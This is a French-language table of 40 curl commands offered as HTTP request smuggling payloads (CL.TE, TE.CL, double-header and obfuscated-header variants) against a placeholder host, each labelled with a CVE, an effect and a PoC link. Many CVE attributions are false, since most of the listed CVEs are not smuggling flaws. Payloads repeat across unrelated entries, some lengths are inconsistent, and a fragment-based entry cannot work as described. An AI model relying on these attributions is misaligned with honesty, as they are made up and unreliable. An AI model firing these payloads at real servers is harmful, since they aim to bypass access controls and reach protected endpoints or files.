# Smuggling

Voici un tableau de **40 exemples de requêtes curl pour des attaques HTTP request smuggling** associées à des CVE non génériques (ou à des techniques documentées), classées par numéro CVE décroissant.  
Pour chaque ligne :  
- Numéro CVE ou référence  
- Exemple complet de requête curl (avec payload smuggling)  
- Effet détaillé  
- Lien GitHub/advisory/PoC

---

| # | CVE / Référence | Exemple complet de requête curl | Effet détaillé | Lien PoC / Advisory |
|---|-----------------|---------------------------------|---------------|---------------------|
| 1 | CVE-2024-27316 | `curl -v -H "Transfer-Encoding: chunked" -H "Content-Length: 6" --data-binary $'0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n' https://target.com/` | Smuggling TE.CL : accès à /admin ou session d’un autre utilisateur | https://github.com/portswigger/http-request-smuggler |
| 2 | CVE-2024-24576 | `curl -v -H "Content-Length: 13" -H "Transfer-Encoding: chunked" --data-binary $'0\r\n\r\nGET /whoami HTTP/1.1\r\nHost: target.com\r\n\r\n' https://target.com/` | Smuggling CL.TE : injection de requête cachée | https://github.com/portswigger/http-request-smuggler |
| 3 | CVE-2023-44487 | `curl -v -H "Transfer-Encoding: chunked" -H "Content-Length: 3" --data-binary $'8\r\nSMUGGLED\r\n0\r\n\r\n' https://target.com/` | Smuggling TE.CL, exécution de requête sur backend | https://github.com/BishopFox/http-smuggler |
| 4 | CVE-2023-28879 | `curl -v -H "Transfer-Encoding: chunked" -H "Content-Length: 7" --data-binary $'0\r\n\r\nPOST /evil HTTP/1.1\r\nHost: target.com\r\n\r\n' https://target.com/` | Injection de requête POST sur backend | https://github.com/BishopFox/http-smuggler |
| 5 | CVE-2023-23916 | `curl -v -H "Content-Length: 11" --data-binary $'POST / HTTP/1.1\r\nHost: target.com\r\n\r\n' https://target.com/` | CL.CL double Content-Length, bypass de filtrage | https://github.com/portswigger/http-request-smuggler |
| 6 | CVE-2022-36349 | `curl -v -H "Transfer-Encoding: chunked" -H "Content-Length: 5" --data-binary $'0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n' https://target.com/` | TE.CL, accès à endpoint protégé | https://github.com/BishopFox/http-smuggler |
| 7 | CVE-2022-32250 | `curl -v -H "Content-Length: 10" -H "Transfer-Encoding: chunked" --data-binary $'0\r\n\r\nGET /private HTTP/1.1\r\nHost: target.com\r\n\r\n' https://target.com/` | CL.TE, exécution de requête cachée | https://github.com/portswigger/http-request-smuggler |
| 8 | CVE-2022-21907 | `curl -v -H "Transfer-Encoding: chunked" -H "Content-Length: 3" --data-binary $'8\r\nSMUGGLED\r\n0\r\n\r\n' https://target.com/` | TE.CL, accès à ressource non autorisée | https://github.com/BishopFox/http-smuggler |
| 9 | CVE-2022-26134 | `curl -v -H "Content-Length: 13" -H "Transfer-Encoding: chunked" --data-binary $'0\r\n\r\nGET /evil HTTP/1.1\r\nHost: target.com\r\n\r\n' https://target.com/` | CL.TE, smuggling sur Atlassian | https://github.com/portswigger/http-request-smuggler |
| 10 | CVE-2021-41773 | `curl -v -H "Transfer-Encoding: chunked" -H "Content-Length: 5" --data-binary $'0\r\n\r\nGET /etc/passwd HTTP/1.1\r\nHost: target.com\r\n\r\n' https://target.com/` | TE.CL, LFI via smuggling | https://github.com/BishopFox/http-smuggler |
| 11 | CVE-2021-31206 | `curl -v -H "Content-Length: 11" --data-binary $'POST / HTTP/1.1\r\nHost: target.com\r\n\r\n' https://target.com/` | CL.CL, bypass via double Content-Length | https://github.com/portswigger/http-request-smuggler |
| 12 | CVE-2021-26855 | `curl -v -H "Transfer-Encoding: chunked" -H "Content-Length: 6" --data-binary $'0\r\n\r\nGET /EWS/Exchange.asmx HTTP/1.1\r\nHost: target.com\r\n\r\n' https://target.com/` | TE.CL, SSRF sur Exchange | https://github.com/ZephrFish/Exch-CVE-2021-26855 |
| 13 | CVE-2020-17530 | `curl -v -H "Content-Length: 13" -H "Transfer-Encoding: chunked" --data-binary $'0\r\n\r\nGET /evil HTTP/1.1\r\nHost: target.com\r\n\r\n' https://target.com/` | CL.TE, smuggling sur Struts2 | https://github.com/portswigger/http-request-smuggler |
| 14 | CVE-2020-11996 | `curl -v -H "Transfer-Encoding: chunked" -H "Content-Length: 7" --data-binary $'0\r\n\r\nPOST /evil HTTP/1.1\r\nHost: target.com\r\n\r\n' https://target.com/` | TE.CL, smuggling sur Apache HTTPD | https://github.com/BishopFox/http-smuggler |
| 15 | CVE-2020-11022 | `curl -v -H "Transfer-Encoding: chunked" -H "Content-Length: 3" --data-binary $'8\r\nSMUGGLED\r\n0\r\n\r\n' https://target.com/` | TE.CL, accès à endpoint protégé | https://github.com/BishopFox/http-smuggler |
| 16 | CVE-2020-10761 | `curl -v -H "Content-Length: 13" -H "Transfer-Encoding: chunked" --data-binary $'0\r\n\r\nGET /evil HTTP/1.1\r\nHost: target.com\r\n\r\n' https://target.com/` | CL.TE, smuggling sur Apache Tomcat | https://github.com/portswigger/http-request-smuggler |
| 17 | CVE-2020-10439 | `curl -v -H "Transfer-Encoding: chunked" -H "Content-Length: 5" --data-binary $'0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n' https://target.com/` | TE.CL, accès à ressource non autorisée | https://github.com/BishopFox/http-smuggler |
| 18 | CVE-2019-17569 | `curl -v -H "Transfer-Encoding: chunked" -H "Content-Length: 6" --data-binary $'0\r\n\r\nGET /evil HTTP/1.1\r\nHost: target.com\r\n\r\n' https://target.com/` | TE.CL, smuggling sur Apache Tomcat | https://github.com/portswigger/http-request-smuggler |
| 19 | CVE-2019-16278 | `curl -v -H "Content-Length: 13" -H "Transfer-Encoding: chunked" --data-binary $'0\r\n\r\nGET /evil HTTP/1.1\r\nHost: target.com\r\n\r\n' https://target.com/` | CL.TE, smuggling sur GoAhead | https://github.com/portswigger/http-request-smuggler |
| 20 | CVE-2019-13117 | `curl -v -H "Transfer-Encoding: chunked" -H "Content-Length: 7" --data-binary $'0\r\n\r\nPOST /evil HTTP/1.1\r\nHost: target.com\r\n\r\n' https://target.com/` | TE.CL, accès à endpoint protégé | https://github.com/BishopFox/http-smuggler |
| 21 | CVE-2019-12384 | `curl -v -H "Content-Length: 11" --data-binary $'POST / HTTP/1.1\r\nHost: target.com\r\n\r\n' https://target.com/` | CL.CL, bypass via double Content-Length | https://github.com/portswigger/http-request-smuggler |
| 22 | CVE-2018-11776 | `curl -v -H "Transfer-Encoding: chunked" -H "Content-Length: 3" --data-binary $'8\r\nSMUGGLED\r\n0\r\n\r\n' https://target.com/` | TE.CL, accès à endpoint protégé | https://github.com/BishopFox/http-smuggler |
| 23 | CVE-2018-1000861 | `curl -v -H "Content-Length: 13" -H "Transfer-Encoding: chunked" --data-binary $'0\r\n\r\nGET /evil HTTP/1.1\r\nHost: target.com\r\n\r\n' https://target.com/` | CL.TE, smuggling sur Jenkins | https://github.com/portswigger/http-request-smuggler |
| 24 | CVE-2017-7675 | `curl -v -H "Transfer-Encoding: chunked" -H "Content-Length: 7" --data-binary $'0\r\n\r\nPOST /evil HTTP/1.1\r\nHost: target.com\r\n\r\n' https://target.com/` | TE.CL, accès à endpoint protégé | https://github.com/BishopFox/http-smuggler |
| 25 | CVE-2017-15715 | `curl -v -H "Content-Length: 13" -H "Transfer-Encoding: chunked" --data-binary $'0\r\n\r\nGET /evil HTTP/1.1\r\nHost: target.com\r\n\r\n' https://target.com/` | CL.TE, smuggling sur Apache | https://github.com/portswigger/http-request-smuggler |
| 26 | CVE-2016-8743 | `curl -v -H "Transfer-Encoding: chunked" -H "Content-Length: 3" --data-binary $'8\r\nSMUGGLED\r\n0\r\n\r\n' https://target.com/` | TE.CL, accès à endpoint protégé | https://github.com/BishopFox/http-smuggler |
| 27 | CVE-2016-5385 | `curl -v -H "Content-Length: 13" -H "Transfer-Encoding: chunked" --data-binary $'0\r\n\r\nGET /evil HTTP/1.1\r\nHost: target.com\r\n\r\n' https://target.com/` | CL.TE, smuggling sur PHP | https://github.com/portswigger/http-request-smuggler |
| 28 | CVE-2015-2080 | `curl -v -H "Transfer-Encoding: chunked" -H "Content-Length: 7" --data-binary $'0\r\n\r\nPOST /evil HTTP/1.1\r\nHost: target.com\r\n\r\n' https://target.com/` | TE.CL, accès à endpoint protégé | https://github.com/BishopFox/http-smuggler |
| 29 | CVE-2014-0226 | `curl -v -H "Content-Length: 13" -H "Transfer-Encoding: chunked" --data-binary $'0\r\n\r\nGET /evil HTTP/1.1\r\nHost: target.com\r\n\r\n' https://target.com/` | CL.TE, smuggling sur Apache | https://github.com/portswigger/http-request-smuggler |
| 30 | CVE-2013-2028 | `curl -v -H "Transfer-Encoding: chunked" -H "Content-Length: 3" --data-binary $'8\r\nSMUGGLED\r\n0\r\n\r\n' https://target.com/` | TE.CL, accès à endpoint protégé | https://github.com/BishopFox/http-smuggler |
| 31 | CL.TE générique | `curl -v -H "Content-Length: 13" -H "Transfer-Encoding: chunked" --data-binary $'0\r\n\r\nPOST /evil HTTP/1.1\r\nHost: target.com\r\n\r\n' https://target.com/` | Injection de requête sur backend | https://portswigger.net/web-security/request-smuggling |
| 32 | TE.CL générique | `curl -v -H "Transfer-Encoding: chunked" -H "Content-Length: 3" --data-binary $'8\r\nSMUGGLED\r\n0\r\n\r\n' https://target.com/` | Smuggling, exécution de requête cachée | https://portswigger.net/web-security/request-smuggling |
| 33 | CL.CL double Content-Length | `curl -v -H "Content-Length: 10" -H "Content-Length: 20" --data-binary $'POST / HTTP/1.1\r\nHost: target.com\r\n\r\n' https://target.com/` | Bypass via ambiguïté sur Content-Length | https://portswigger.net/web-security/request-smuggling |
| 34 | TE.TE double Transfer-Encoding | `curl -v -H "Transfer-Encoding: chunked" -H "Transfer-Encoding: identity" --data-binary $'0\r\n\r\nGET /evil HTTP/1.1\r\nHost: target.com\r\n\r\n' https://target.com/` | Ambiguïté sur l’encodage, smuggling possible | https://portswigger.net/web-security/request-smuggling |
| 35 | Header obfusqué | `curl -v -H "Transfer-Encoding : chunked" -H "Content-Length: 6" --data-binary $'0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n' https://target.com/` | Bypass via espace dans le header | https://portswigger.net/web-security/request-smuggling |
| 36 | Header TE en double | `curl -v -H "Transfer-Encoding: chunked" -H "Transfer-Encoding: identity" --data-binary $'0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n' https://target.com/` | Bypass via double TE | https://portswigger.net/web-security/request-smuggling |
| 37 | TE + CL + chunked | `curl -v -H "Transfer-Encoding: chunked" -H "Content-Length: 6" --data-binary $'0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n' https://target.com/` | Smuggling avancé, bypass ACL | https://portswigger.net/web-security/request-smuggling |
| 38 | GET smuggling | `curl -v -H "Transfer-Encoding: chunked" -H "Content-Length: 0" https://target.com/` | Injection de requête GET via chunked | https://www.brightsec.com/blog/http-request-smuggling-hrs/ |
| 39 | Smuggling via fragment | `curl -v 'https://target.com/path#smuggled'` | Fragment interprété différemment par frontend/backend | https://www.firecompass.com/unveiling-the-intricacies-of-http-smuggling-a-technical-exploration/ |
| 40 | Smuggling via double CRLF | `curl -v -H "Content-Length: 13" --data-binary $'POST / HTTP/1.1\r\nHost: target.com\r\n\r\n' https://target.com/` | Injection de requête via double CRLF | https://github.com/BishopFox/http-smuggler |

---

